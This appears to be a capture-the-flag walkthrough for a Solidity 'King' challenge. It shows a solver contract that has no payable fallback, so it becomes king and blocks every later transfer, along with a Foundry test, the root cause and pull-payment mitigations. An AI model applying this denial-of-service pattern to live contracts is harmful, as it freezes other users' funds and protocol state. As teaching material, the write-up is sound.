# 09. King

[English](09_King.md) | [한국어](../ko/09_King.md)

## Objective

Claim the king position and keep the level owner from replacing the solver.

## Key Concepts

- Push-based ETH transfers
- Payable callbacks
- `transfer`
- State transitions that depend on external calls
- Availability of recipient contracts

## Contract Analysis

The target pays the current king before recording the next king:

```solidity
receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
}
```

If the current king is a contract that cannot accept ETH, `transfer` reverts. The following ownership and prize updates never execute because the entire call is rolled back.

## Solver Contract

`KingSolver` can make the initial payable call through `solve()`, but it intentionally defines neither `receive()` nor `fallback()`:

```solidity
contract KingSolver {
    function solve(address payable target) external payable {
        (bool success,) = target.call{value: msg.value}("");
        require(success, "Call failed");
    }
}
```

This allows the solver to become king while preventing the target from sending the next payment back to it.

## Solution Flow

```text
Owner deploys King with a 0.1 ETH prize
        ↓
Player sends 1 ETH through KingSolver
        ↓
King pays the previous king and records KingSolver
        ↓
Owner submits 2 ETH to replace the solver
        ↓
King tries to transfer 2 ETH to KingSolver
        ↓
KingSolver has no payable callback
        ↓
The replacement call returns false and state remains unchanged
```

## Foundry Test

The test checks the successful claim and the failed replacement separately:

```solidity
vm.prank(player);
solver.solve{value: 1 ether}(payable(address(target)));

assertEq(target._king(), address(solver));
assertEq(target.prize(), 1 ether);

vm.prank(owner);
(bool reclaimed,) = address(target).call{value: 2 ether}("");

assertFalse(reclaimed);
assertEq(target._king(), address(solver));
assertEq(target.prize(), 1 ether);
```

Capturing the Boolean returned by the low-level call makes the expected failure explicit without leaving an unchecked-call warning.

## Root Cause

Progress depends on successfully sending ETH to an address selected during the previous state transition. A recipient contract can reject that transfer and prevent the remaining state updates.

## Recommended Mitigations

- Prefer pull-based payments: record a claimable amount and let each recipient withdraw separately.
- Do not make a core state transition depend on an arbitrary recipient accepting ETH.
- When an external payment may fail, keep its failure isolated from unrelated state updates.
- Use explicit accounting and test recipients with and without payable callbacks.

## Run the Test

```bash
forge test --match-path test/09_King.t.sol -vvv
```

For the complete call trace:

```bash
forge test --match-path test/09_King.t.sol -vvvv
```

## Takeaway

Push-based payments give the recipient control over whether the caller can finish its state transition. Pull-based accounting keeps one recipient's behavior from blocking the rest of the protocol.
